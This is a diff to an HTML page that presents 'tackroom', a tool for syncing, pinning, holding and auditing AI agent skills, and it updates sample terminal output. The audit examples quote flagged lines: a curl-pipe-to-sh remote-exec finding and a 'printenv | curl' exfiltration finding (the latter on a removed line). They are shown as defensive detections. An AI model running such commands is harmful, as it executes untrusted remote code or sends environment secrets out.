@@ -70,7 +70,8 @@
       </div>
       <figure class="term">
         <figcaption>$ tackroom status (excerpt, demo home)</figcaption>
-<pre>sources
+<pre>repo   <span class="o">✓</span> ~/.agents
+sources
   agent-skills  <span class="o">✓</span> <span class="h">774ddc2</span>  https://github.com/acme/agent-skills
 
 claude   <span class="o">✓ synced</span>
@@ -80,7 +81,7 @@ Everything is synced.
 
 held or blocked (skipped by sync)
   <span class="r"><b>blocked</b></span> skill:shell-kit: exfiltration in skills/shell-runner/scripts/report.sh; override: tackroom doctor audit accept skill:shell-kit exfiltration --reason "..."
-  <span class="y"><b>held</b></span> skill:lint-skills: git:https://github.com/example/lint-skills@d9eb44d8209b30dc27853d7d40ce2bc5a9de152f published 2026-11-11T22:31:37Z (git-commit-date); hold ends 2026-11-14T22:31:37Z; override: tackroom sync --allow-fresh=skill:lint-skills</pre>
+  <span class="y"><b>held</b></span> skill:lint-skills: git:https://github.com/example/lint-skills@ab9ea7e5f6b6d3543f2e51166951eec3ac79415d published 2026-11-11T23:03:39Z (git-commit-date); hold ends 2026-11-14T23:03:39Z; override: tackroom sync --allow-fresh=skill:lint-skills</pre>
       </figure>
     </div>
   </section>
@@ -114,7 +115,7 @@ held or blocked (skipped by sync)
         <li><svg class="hanger" viewBox="0 0 16 18" aria-hidden="true"><path d="M5 1V10a4 4 0 0 0 8 0"/></svg><div class="plate"><div class="plate-top"><span class="plate-name">Tern</span><img class="mark" src="marks/tern.png" width="24" height="24" alt=""></div><span class="plate-key">tern</span></div></li>
         <li><svg class="hanger" viewBox="0 0 16 18" aria-hidden="true"><path d="M5 1V10a4 4 0 0 0 8 0"/></svg><div class="plate"><div class="plate-top"><span class="plate-name">Rex</span><img class="mark" src="marks/rex.png" width="24" height="24" alt=""></div><span class="plate-key">rex</span></div></li>
       </ul>
-      <p class="after"><a href="docs/herdr/">Herdr</a> gets a Crons panel, <a href="docs/tern/">Tern</a> a <code>tackroom tern</code> workspace, <a href="docs/rex/">Rex</a> a doctor check.</p>
+      <p class="after"><a href="docs/herdr/">Herdr</a> gets a Crons panel, <a href="docs/tern/">Tern</a> a crons panel and a <code>tackroom tern</code> workspace, <a href="docs/rex/">Rex</a> a doctor check.</p>
     </div>
   </section>
 
@@ -136,10 +137,10 @@ held or blocked (skipped by sync)
 holds:
 <span class="d">      ...</span>
     - item: <span class="y">skill:lint-skills</span>
-      ref: git:https://github.com/example/lint-skills@d9eb44d8209b30dc27853d7d40ce2bc5a9de152f
-      published_at: "2026-11-11T22:31:37Z"
+      ref: git:https://github.com/example/lint-skills@ab9ea7e5f6b6d3543f2e51166951eec3ac79415d
+      published_at: "2026-11-11T23:03:39Z"
       time_source: git-commit-date
-      hold_until: <span class="y">"2026-11-14T22:31:37Z"</span></pre>
+      hold_until: <span class="y">"2026-11-14T23:03:39Z"</span></pre>
           <details class="full"><summary>Show the whole file</summary>
 <pre><span class="d"># Managed by tackroom sync / tackroom skill update. Pins commits and materialized skill ownership.</span>
 version: 1
@@ -158,10 +159,10 @@ holds:
       time_source: git-commit-date
       hold_until: "2026-10-05T11:00:00Z"
     - item: <span class="y">skill:lint-skills</span>
-      ref: git:https://github.com/example/lint-skills@d9eb44d8209b30dc27853d7d40ce2bc5a9de152f
-      published_at: "2026-11-11T22:31:37Z"
+      ref: git:https://github.com/example/lint-skills@ab9ea7e5f6b6d3543f2e51166951eec3ac79415d
+      published_at: "2026-11-11T23:03:39Z"
       time_source: git-commit-date
-      hold_until: <span class="y">"2026-11-14T22:31:37Z"</span></pre>
+      hold_until: <span class="y">"2026-11-14T23:03:39Z"</span></pre>
           </details>
         </figure>
         <ul class="states">
@@ -169,6 +170,8 @@ holds:
             <svg class="ico pin" aria-hidden="true"><use href="#i-pin"/></svg>
             <div class="state-body">
               <span class="tag t-pin"><span class="g">✓</span><span class="w">pinned <code>774ddc2</code></span></span>
+              <span class="real"><span class="d">$ tackroom status</span>
+  agent-skills  ✓ 774ddc2  https://github.com/acme/agent-skills</span>
               <p>Agents see this commit of <code>acme/agent-skills</code> and nothing newer. Only <code>tackroom skill update</code> moves the pin.</p>
             </div>
           </li>
@@ -177,6 +180,8 @@ holds:
             <div class="state-body">
               <span class="tag t-warn"><span class="g">!</span><span class="w">held <code>41h of 72h</code></span></span>
               <div class="hold"><div class="hold-track" role="img" aria-label="41 of 72 hours elapsed"><i></i><b></b></div><span class="hold-meta">31h left</span></div>
+              <span class="real"><span class="d">$ tackroom status</span>
+  held skill:lint-skills: git:https://github.com/example/lint-skills@ab9ea7e5f6b6d3543f2e51166951eec3ac79415d published 2026-11-11T23:03:39Z (git-commit-date); hold ends 2026-11-14T23:03:39Z; override: tackroom sync --allow-fresh=skill:lint-skills</span>
               <p>Sync skips it and agents keep what they have. Wait, or release it now with <code>tackroom sync --allow-fresh=skill:lint-skills</code>.</p>
             </div>
           </li>
@@ -184,7 +189,8 @@ holds:
             <svg class="ico" aria-hidden="true"><use href="#i-audit"/></svg>
             <div class="state-body">
               <span class="tag t-ok"><span class="g">✓</span><span class="w">audit pass</span></span>
-              <span class="real">  external skill audit ........... pass (1 skills scanned, no risky patterns)</span>
+              <span class="real"><span class="d">$ tackroom doctor</span>
+  ✓ external skill audit          1 skills scanned, no risky patterns</span>
               <p>Nothing to do.</p>
             </div>
           </li>
@@ -192,7 +198,8 @@ holds:
             <svg class="ico" aria-hidden="true"><use href="#i-audit"/></svg>
             <div class="state-body">
               <span class="tag t-warn"><span class="g">!</span><span class="w">audit finding <code>remote-exec</code></span></span>
-              <span class="real">  HIGH     remote-exec  skills/pr-shepherd/scripts/setup-ci.sh  curl -fsSL https://ci-tools.example.com/install.sh | sh</span>
+              <span class="real"><span class="d">$ tackroom doctor audit</span>
+  HIGH     remote-exec  skills/pr-shepherd/scripts/setup-ci.sh  curl -fsSL https://ci-tools.example.com/install.sh | sh</span>
               <p>Reported, not blocked. Read it with <code>tackroom doctor audit</code> and decide whether to keep the source.</p>
             </div>
           </li>
@@ -200,8 +207,9 @@ holds:
             <svg class="ico" aria-hidden="true"><use href="#i-audit"/></svg>
             <div class="state-body">
               <span class="tag t-bad"><span class="g">✗</span><span class="w">blocked <code>exfiltration</code></span></span>
-              <span class="real">  CRITICAL exfiltration  skills/shell-runner/scripts/report.sh  printenv | curl</span>
-              <p>Sync skips it and any earlier pin stays. If you trust it anyway, record why: <code>tackroom doctor audit accept skill:shell-kit exfiltration --reason "..."</code></p>
+              <span class="real"><span class="d">$ tackroom status</span>
+  blocked skill:shell-kit: exfiltration in skills/shell-runner/scripts/report.sh; override: tackroom doctor audit accept skill:shell-kit exfiltration --reason "..."</span>
+              <p>Sync skips it and any earlier pin stays. Wait for a fix upstream, or accept it with a reason: <code>tackroom doctor audit accept skill:shell-kit exfiltration --reason "..."</code></p>
             </div>
           </li>
         </ul>
@@ -242,7 +250,11 @@ holds:
             <figcaption>after adding three skill sources and one MCP server</figcaption>
 <pre><span class="p">$</span> tackroom sync
 tackroom sync  <span class="o">✓ synced</span>
-<span class="d">...</span>
+
+changes  +2 skills, +1 mcp (claude, codex, pi) · +2 skills (omp)
+repo     <span class="o">✓</span> ~/.agents
+sources  agent-skills  <span class="o">✓</span> <span class="h">774ddc2</span>  https://github.com/acme/agent-skills
+
 ╭─────────┬──────────┬────────┬────────┬─────┬───────┬─────────┬──────────╮
 │ harness │ state    │ skills │ agents │ mcp │ hooks │ plugins │ packages │
 ├─────────┼──────────┼────────┼────────┼─────┼───────┼─────────┼──────────┤
@@ -261,7 +273,7 @@ skipped 1 blocked and 1 held item(s); see tackroom status</pre>
         <li>
           <div class="say">
             <h3>Check</h3>
-            <p><code>tackroom status</code> shows what is synced, held or blocked. <code>tackroom doctor</code> checks skills, roles, pins, audits and hooks. <code>tackroom view</code> opens a local dashboard over the same config.</p>
+            <p><code>tackroom status</code> shows what is synced, held or blocked. <code>tackroom doctor</code> checks skills, roles, pins, audits and hooks. <code>tackroom tui</code> shows the same state in a full-screen terminal view, read-only, and <code>tackroom view</code> opens a local dashboard over the same config.</p>
           </div>
         </li>
       </ol>
